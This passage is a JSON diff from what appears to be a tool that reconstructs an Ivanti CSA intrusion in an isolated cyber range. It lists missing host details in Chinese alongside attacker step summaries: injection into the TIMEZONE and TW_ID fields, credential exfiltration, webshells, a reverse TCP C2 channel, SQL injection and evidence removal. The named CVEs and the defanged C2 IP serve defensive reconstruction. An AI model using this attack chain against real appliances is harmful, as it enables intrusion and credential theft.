+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "gggg.oyr2ohrm.eyes.sh"
+  }
+ ],
+ "missing_items": [
+  {
+   "id": "missing-hosts-h1-os",
+   "field": "Ivanti Cloud Service Appliance (CSA) — 作業系統",
+   "category": "host",
+   "reason": "來源未提供這台主機/資產的作業系統；不能由產品或角色直接推定。",
+   "severity": "major",
+   "status": "open",
+   "question": "Ivanti Cloud Service Appliance (CSA) 實際使用哪個作業系統？原文只提供主機/資產線索，請填實際系統或標記未知。",
+   "affects": [
+    "hosts:h1 — Ivanti Cloud Service Appliance (CSA)",
+    "action:a1 — Sent GET request to datetime.php to acquire session and CSRF tokens",
+    "action:a2 — Sent POST request to datetime.php using TIMEZONE input field to execute code",
+    "action:a3 — Exfiltrated encrypted admin credentials",
+    "action:a4 — Decrypted encrypted admin credentials using executable in /tmp directory",
+    "action:a5 — Logged in and exploited CVE-2024-9380 to execute commands from higher privileged account",
+    "action:a6 — Sent GET request to /gsb/reports.php",
+    "action:a7 — Sent POST request using TW_ID input field to execute code and implant webshells",
+    "action:a8 — Attempted to create webshells using two different paths",
+    "action:a9 — Executed script to create reverse TCP command and control channel",
+    "action:a10 — Used sudo commands to disable vulnerability, modify and remove webshells, and remove evidence",
+    "action:a12 — Performed discovery on CSA device using Obelisk and GoGo scanners",
+    "action:a14 — Exploited CVE-2024-8963 and CVE-2024-9379 using GET and POST requests to broker.php",
+    "action:a15 — Executed SQL injection to insert user into user_info table",
+    "action:a16 — Attempted to login as inserted user to coerce application into running bash code"
+   ],
+   "suggestions": [
+    "Windows Server（候選；需確認）",
+    "Linux Server（候選；需確認）",
+    "其他作業系統（請填確切名稱）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Ivanti Cloud Service Appliance (CSA)",
+     "source_ref": "hosts:h1.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-28",
+      "evidence-29",
+      "evidence-30",
+      "evidence-1",
+      "evidence-2",
+      "evidence-3",
+      "evidence-4",
+      "evidence-5",
+      "evidence-6",
+      "evidence-7",
+      "evidence-8",
+      "evidence-9",
+      "evidence-10",
+      "evidence-12",
+      "evidence-14",
+      "evidence-15",
+      "evidence-16",
+      "evidence-17"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "examples": [
+    "Windows Server（候選；需確認）",
+    "Linux Server（候選；需確認）",
+    "其他作業系統（請填確切名稱）"
+   ],
+   "target": {
+    "collection": "hosts",
+    "id": "h1",
+    "field": "os"
+   }
+  },
+  {
+   "id": "missing-hosts-h1-os-version",
+   "field": "Ivanti Cloud Service Appliance (CSA) — 作業系統版本",
+   "category": "version",
+   "reason": "來源未提供這台主機/資產的確切 OS 版本或 build。",
+   "severity": "major",
+   "status": "open",
+   "question": "Ivanti Cloud Service Appliance (CSA) 的作業系統確切版本/build 是什麼？若無法確認，請明確保留未知。",
+   "affects": [
+    "hosts:h1 — Ivanti Cloud Service Appliance (CSA)",
+    "action:a1 — Sent GET request to datetime.php to acquire session and CSRF tokens",
+    "action:a2 — Sent POST request to datetime.php using TIMEZONE input field to execute code",
+    "action:a3 — Exfiltrated encrypted admin credentials",
+    "action:a4 — Decrypted encrypted admin credentials using executable in /tmp directory",
+    "action:a5 — Logged in and exploited CVE-2024-9380 to execute commands from higher privileged account",
+    "action:a6 — Sent GET request to /gsb/reports.php",
+    "action:a7 — Sent POST request using TW_ID input field to execute code and implant webshells",
+    "action:a8 — Attempted to create webshells using two different paths",
+    "action:a9 — Executed script to create reverse TCP command and control channel",
+    "action:a10 — Used sudo commands to disable vulnerability, modify and remove webshells, and remove evidence",
+    "action:a12 — Performed discovery on CSA device using Obelisk and GoGo scanners",
+    "action:a14 — Exploited CVE-2024-8963 and CVE-2024-9379 using GET and POST requests to broker.php",
+    "action:a15 — Executed SQL injection to insert user into user_info table",
+    "action:a16 — Attempted to login as inserted user to coerce application into running bash code"
+   ],
+   "suggestions": [
+    "請填原文或資產清單中的確切作業系統版本",
+    "Windows Server（build 待確認）",
+    "Linux 發行版（版本待確認）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Ivanti Cloud Service Appliance (CSA)",
+     "source_ref": "hosts:h1.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-28",
+      "evidence-29",
+      "evidence-30",
+      "evidence-1",
+      "evidence-2",
+      "evidence-3",
+      "evidence-4",
+      "evidence-5",
+      "evidence-6",
+      "evidence-7",
+      "evidence-8",
+      "evidence-9",
+      "evidence-10",
+      "evidence-12",
+      "evidence-14",
+      "evidence-15",
+      "evidence-16",
+      "evidence-17"
+     ]
+    },
+    {
+     "field": "作業系統版本",
+     "value": "4.6x versions before 519 and 5.0.1 and below",
+     "source_ref": "hosts:h1.os_version",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-28",
+      "evidence-29",
+      "evidence-30",
+      "evidence-1",
+      "evidence-2",
+      "evidence-3",
+      "evidence-4",
+      "evidence-5",
+      "evidence-6",
+      "evidence-7",
+      "evidence-8",
+      "evidence-9",
+      "evidence-10",
+      "evidence-12",
+      "evidence-14",
+      "evidence-15",
+      "evidence-16",
+      "evidence-17"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h1",
+    "field": "os_version"
+   }
+  },
+  {
+   "id": "missing-hosts-h1-network",
+   "field": "Ivanti Cloud Service Appliance (CSA) — 網段/網路位置",
+   "category": "network",
+   "reason": "IR 有主機或資產線索，但沒有可部署的網段與可達性設定。",
+   "severity": "major",
+   "status": "open",
+   "question": "Ivanti Cloud Service Appliance (CSA) 要放在哪個網段？請指出隔離/內網/DMZ 等位置，以及哪些來源可以連到它。",
+   "affects": [
+    "hosts:h1 — Ivanti Cloud Service Appliance (CSA)",
+    "action:a1 — Sent GET request to datetime.php to acquire session and CSRF tokens",
+    "action:a2 — Sent POST request to datetime.php using TIMEZONE input field to execute code",
+    "action:a3 — Exfiltrated encrypted admin credentials",
+    "action:a4 — Decrypted encrypted admin credentials using executable in /tmp directory",
+    "action:a5 — Logged in and exploited CVE-2024-9380 to execute commands from higher privileged account",
+    "action:a6 — Sent GET request to /gsb/reports.php",
+    "action:a7 — Sent POST request using TW_ID input field to execute code and implant webshells",
+    "action:a8 — Attempted to create webshells using two different paths",
+    "action:a9 — Executed script to create reverse TCP command and control channel",
+    "action:a10 — Used sudo commands to disable vulnerability, modify and remove webshells, and remove evidence",
+    "action:a12 — Performed discovery on CSA device using Obelisk and GoGo scanners",
+    "action:a14 — Exploited CVE-2024-8963 and CVE-2024-9379 using GET and POST requests to broker.php",
+    "action:a15 — Executed SQL injection to insert user into user_info table",
+    "action:a16 — Attempted to login as inserted user to coerce application into running bash code"
+   ],
+   "suggestions": [
+    "內部／管理網段（候選；請確認允許來源）",
+    "隔離測試網段（只連必要主機）",
+    "其他網段（請描述區域與可達路徑）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Ivanti Cloud Service Appliance (CSA)",
+     "source_ref": "hosts:h1.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-28",
+      "evidence-29",
+      "evidence-30",
+      "evidence-1",
+      "evidence-2",
+      "evidence-3",
+      "evidence-4",
+      "evidence-5",
+      "evidence-6",
+      "evidence-7",
+      "evidence-8",
+      "evidence-9",
+      "evidence-10",
+      "evidence-12",
+      "evidence-14",
+      "evidence-15",
+      "evidence-16",
+      "evidence-17"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h1",
+    "field": "network_placement"
+   }
+  },
+  {
+   "id": "missing-hosts-h2-os",
+   "field": "Jenkins server — 作業系統",
+   "category": "host",
+   "reason": "來源未提供這台主機/資產的作業系統；不能由產品或角色直接推定。",
+   "severity": "major",
+   "status": "open",
+   "question": "Jenkins server 實際使用哪個作業系統？原文只提供主機/資產線索，請填實際系統或標記未知。",
+   "affects": [
+    "hosts:h2 — Jenkins server",
+    "action:a11 — Performed lateral movement to Jenkins server"
+   ],
+   "suggestions": [
+    "Windows Server（候選；需確認）",
+    "Linux Server（候選；需確認）",
+    "其他作業系統（請填確切名稱）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Jenkins server",
+     "source_ref": "hosts:h2.role",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-31",
+      "evidence-11"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "examples": [
+    "Windows Server（候選；需確認）",
+    "Linux Server（候選；需確認）",
+    "其他作業系統（請填確切名稱）"
+   ],
+   "target": {
+    "collection": "hosts",
+    "id": "h2",
+    "field": "os"
+   }
+  },
+  {
+   "id": "missing-hosts-h2-os-version",
+   "field": "Jenkins server — 作業系統版本",
+   "category": "version",
+   "reason": "來源未提供這台主機/資產的確切 OS 版本或 build。",
+   "severity": "major",
+   "status": "open",
+   "question": "Jenkins server 的作業系統確切版本/build 是什麼？若無法確認，請明確保留未知。",
+   "affects": [
+    "hosts:h2 — Jenkins server",
+    "action:a11 — Performed lateral movement to Jenkins server"
+   ],
+   "suggestions": [
+    "請填原文或資產清單中的確切作業系統版本",
+    "Windows Server（build 待確認）",
+    "Linux 發行版（版本待確認）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Jenkins server",
+     "source_ref": "hosts:h2.role",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-31",
+      "evidence-11"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h2",
+    "field": "os_version"
+   }
+  },
+  {
+   "id": "missing-hosts-h2-network",
+   "field": "Jenkins server — 網段/網路位置",
+   "category": "network",
+   "reason": "IR 有主機或資產線索，但沒有可部署的網段與可達性設定。",
+   "severity": "major",
+   "status": "open",
+   "question": "Jenkins server 要放在哪個網段？請指出隔離/內網/DMZ 等位置，以及哪些來源可以連到它。",
+   "affects": [
+    "hosts:h2 — Jenkins server",
+    "action:a11 — Performed lateral movement to Jenkins server"
+   ],
+   "suggestions": [
+    "內部／管理網段（候選；請確認允許來源）",
+    "隔離測試網段（只連必要主機）",
+    "其他網段（請描述區域與可達路徑）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Jenkins server",
+     "source_ref": "hosts:h2.role",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-31",
+      "evidence-11"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h2",
+    "field": "network_placement"
+   }
+  },
+  {
+   "id": "missing-hosts-h3-os",
+   "field": "VPN server — 作業系統",
+   "category": "host",
+   "reason": "來源未提供這台主機/資產的作業系統；不能由產品或角色直接推定。",
+   "severity": "major",
+   "status": "open",
+   "question": "VPN server 實際使用哪個作業系統？原文只提供主機/資產線索，請填實際系統或標記未知。",
+   "affects": [
+    "hosts:h3 — VPN server",
+    "action:a13 — Attempted to log into VPN server but were unsuccessful"
+   ],
+   "suggestions": [
+    "Windows Server（候選；需確認）",
+    "Linux Server（候選；需確認）",
+    "其他作業系統（請填確切名稱）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "VPN server",
+     "source_ref": "hosts:h3.role",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-13"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "examples": [
+    "Windows Server（候選；需確認）",
+    "Linux Server（候選；需確認）",
+    "其他作業系統（請填確切名稱）"
+   ],
+   "target": {
+    "collection": "hosts",
+    "id": "h3",
+    "field": "os"
+   }
+  },
+  {
+   "id": "missing-hosts-h3-os-version",
+   "field": "VPN server — 作業系統版本",
+   "category": "version",
+   "reason": "來源未提供這台主機/資產的確切 OS 版本或 build。",
+   "severity": "major",
+   "status": "open",
+   "question": "VPN server 的作業系統確切版本/build 是什麼？若無法確認，請明確保留未知。",
+   "affects": [
+    "hosts:h3 — VPN server",
+    "action:a13 — Attempted to log into VPN server but were unsuccessful"
+   ],
+   "suggestions": [
+    "請填原文或資產清單中的確切作業系統版本",
+    "Windows Server（build 待確認）",
+    "Linux 發行版（版本待確認）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "VPN server",
+     "source_ref": "hosts:h3.role",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-13"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h3",
+    "field": "os_version"
+   }
+  },
+  {
+   "id": "missing-hosts-h3-network",
+   "field": "VPN server — 網段/網路位置",
+   "category": "network",
+   "reason": "IR 有主機或資產線索，但沒有可部署的網段與可達性設定。",
+   "severity": "major",
+   "status": "open",
+   "question": "VPN server 要放在哪個網段？請指出隔離/內網/DMZ 等位置，以及哪些來源可以連到它。",
+   "affects": [
+    "hosts:h3 — VPN server",
+    "action:a13 — Attempted to log into VPN server but were unsuccessful"
+   ],
+   "suggestions": [
+    "隔離測試網段（只連必要主機）",
+    "內部網段（請描述允許來源）",
+    "對外 DMZ（只有原文/拓樸確認時才選）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "VPN server",
+     "source_ref": "hosts:h3.role",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-13"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h3",
+    "field": "network_placement"
+   }
+  },
+  {
+   "id": "missing-service-s2-version",
+   "field": "Ivanti CSA web application — 版本",
+   "category": "version",
+   "reason": "IR 指出 Ivanti CSA web application，但沒有可重現所需的確切版本。",
+   "severity": "major",
+   "status": "open",
+   "question": "靶場要重建 Ivanti CSA web application 的哪個版本？原文沒有寫的話，請從資產清單核對或明確選擇替代版本，不要由產品名稱猜測。",
+   "affects": [
+    "service:s2 — Ivanti CSA web application",
+    "action:a14 — Exploited CVE-2024-8963 and CVE-2024-9379 using GET and POST requests to broker.php"
+   ],
+   "suggestions": [
+    "填入來源或資產清單記載的確切版本",
+    "選用隔離靶場可取得的替代版本並標記為替代",
+    "無法確認；保留為未知"
+   ],
+   "known": [
+    {
+     "field": "受害軟體/服務",
+     "value": "Ivanti CSA web application",
+     "source_ref": "services:s2.name",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-35",
+      "evidence-18",
+      "evidence-36",
+      "evidence-37",
+      "evidence-14"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "services",
+    "id": "s2",
+    "field": "version"
+   }
+  },
+  {
+   "id": "missing-service-s2-configuration",
+   "field": "Ivanti CSA web application — 靶場部署/連線設定",
+   "category": "dependency",
+   "reason": "a14 使用 Ivanti CSA web application，但 IR 沒有提供重建所需的服務設定。",
+   "severity": "major",
+   "status": "open",
+   "question": "a14 依賴 Ivanti CSA web application。靶場中部署端點、連接埠、啟用狀態與允許來源要如何設定？請只提供隔離靶場資訊。",
+   "affects": [
+    "service:s2 — Ivanti CSA web application",
+    "action:a14 — Exploited CVE-2024-8963 and CVE-2024-9379 using GET and POST requests to broker.php"
+   ],
+   "suggestions": [
+    "只在隔離網段開放必要連接埠",
+    "以來源明確記載的設定為準",
+    "保留未知並不部署此服務"
+   ],
+   "known": [
+    {
+     "field": "IR 服務線索",
+     "value": "Ivanti CSA web application",
+     "source_ref": "services:s2.name",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-35",
+      "evidence-18",
+      "evidence-36",
+      "evidence-37",
+      "evidence-14"
+     ]
+    },
+    {
+     "field": "依賴此服務的步驟",
+     "value": "Exploited CVE-2024-8963 and CVE-2024-9379 using GET and POST requests to broker.php",
+     "source_ref": "actions:a14.name",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-14",
+      "evidence-15"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "services",
+    "id": "s2",
+    "field": "configuration"
+   }
+  },
+  {
+   "id": "missing-network-outbound-policy",
+   "field": "下載/C2 步驟的對外連線政策",
+   "category": "network",
+   "reason": "多個具名步驟需要下載檔案或建立 Ngrok/C2 連線，但 IR 沒有說明靶場允許哪些外連。",
+   "severity": "major",
+   "status": "open",
+   "question": "a9 涉及下載、上傳或 Ngrok/C2。靶場是否完全封鎖外連、只接 sinkhole/模擬服務，或僅允許原文列出的目的地？請指定封鎖/允許規則；不要直接開放任意網際網路。",
+   "affects": [
+    "action:a9 — Executed script to create reverse TCP command and control channel"
+   ],
+   "suggestions": [
+    "封鎖對外連線（隔離預設）",
+    "只允許連到指定 sinkhole/模擬服務",
+    "只允許報告列出的目的地（需確認隔離規則）"
+   ],
+   "known": [
+    {
+     "field": "需要外連的步驟",
+     "value": "Executed script to create reverse TCP command and control channel",
+     "source_ref": "actions:a9.name",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-9"
+     ]
+    },
+    {
+     "field": "原文列出的外部目的地",
+     "value": "107.173.89[.]16",
+     "source_ref": "evidence:evidence-9",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-9"
+     ]
+    }
+   ],
+   "needs_user_decision": true
+  }
+ ],
+ "quality": {
+  "quote_verified_rate": 0.9399,
+  "unsupported_claim_count": 8,
+  "inferred_count": 3,
+  "absent_count": 0,
+  "method": "single_pass",
+  "provisional": true,
+  "dropped_placeholder_hosts": 0,
+  "excluded_non_attacker_actions": [],
+  "hedged_action_count": 1,
+  "capability_action_count": 0,
+  "dropped_non_software_services": [],
+  "dropped_misplaced_techniques": []
+ },
+ "id": "scn_evidence"
+}
